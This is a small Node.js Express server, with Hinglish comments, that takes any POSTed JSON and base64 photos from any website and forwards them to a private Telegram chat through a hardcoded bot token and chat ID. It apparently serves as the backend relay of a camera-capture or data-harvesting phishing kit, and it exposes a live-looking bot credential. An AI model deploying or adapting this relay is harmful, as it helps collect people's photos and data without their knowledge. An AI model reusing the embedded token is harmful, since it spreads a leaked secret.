import express from "express";
import cors from "cors";
import fetch from "node-fetch";
import FormData from "form-data";

const app = express();
app.use(cors());
app.use(express.json({ limit: "10mb" }));

// 🔑 APNA TOKEN & CHAT ID DAAL
const BOT_TOKEN = "8602903777:AAFzN6idIz9vL5pX-Srq468bKCCGmBJM3LA";
const CHAT_ID = "8111461057";

// TEST
app.get("/", (req, res) => {
  res.send("Server Running 🚀");
});

// 📊 DATA (RAW)
app.post("/data", async (req, res) => {
  const rawText = "📊 DATA:\n\n" + JSON.stringify(req.body, null, 2);

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: rawText
      })
    });
  } catch (e) {
    console.log(e);
  }

  res.send({ status: "ok" });
});

// 📸 PHOTO
app.post("/photo", async (req, res) => {
  const { imageData } = req.body;

  if (!imageData) return res.send({ status: "no image" });

  const base64 = imageData.replace(/^data:image\/\w+;base64,/, "");
  const buffer = Buffer.from(base64, "base64");

  const form = new FormData();
  form.append("chat_id", CHAT_ID);
  form.append("photo", buffer, { filename: "photo.jpg" });

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: form
    });
  } catch (e) {
    console.log(e);
  }

  res.send({ status: "photo sent" });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("Server running on port " + PORT);
});
